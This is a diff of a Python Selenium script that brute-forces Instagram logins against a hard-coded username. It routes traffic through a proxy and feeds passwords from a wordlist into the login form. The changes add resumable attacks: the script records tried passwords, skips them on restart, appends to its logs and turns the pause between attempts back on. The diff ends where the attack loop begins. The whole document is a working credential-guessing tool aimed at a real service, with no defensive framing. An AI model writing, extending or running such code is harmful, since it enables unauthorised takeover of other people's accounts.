@@ -1,14 +1,16 @@
 #!/usr/bin/python
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
-import time
+import time, os
 
 username = 'redhootcp'
 delay = 0
 passwords = [ '666666' ]
+used_passwords = []
 
 report_file = 'report.log'
 used_passwords_file = 'used_passes.txt'
+passwords_file = 'wordlist.txt'
 
 def login():
     driver.get('https://www.instagram.com/accounts/login/?force_classic_login')
@@ -20,7 +22,7 @@ def login():
     elem.clear()
     elem.send_keys(password)
     elem.send_keys(Keys.RETURN)
-#    time.sleep(delay)
+    time.sleep(delay)
 
 def browser_config():
     profile = webdriver.FirefoxProfile()
@@ -32,13 +34,17 @@ def browser_config():
     profile.set_preference("network.proxy.type", 1)
     return profile
 
-with open('wordlist.txt', 'r') as f:
-    passwords = f.readlines()
+with open(passwords_file, 'r') as a:
+    passwords_queue = a.readlines()
+if os.path.isfile(used_passwords_file):
+  with open(used_passwords_file, 'r') as b:
+    used_passwords = b.readlines()
 
+passwords = [x for x in passwords_queue if x not in used_passwords]
 
 profile = browser_config()
-report = open(report_file, 'wt')
-used_passes = open(used_passwords_file, 'wt')
+report = open(report_file, 'a')
+used_passes = open(used_passwords_file, 'a')
 driver = webdriver.Firefox(profile)
 
 for line in passwords:
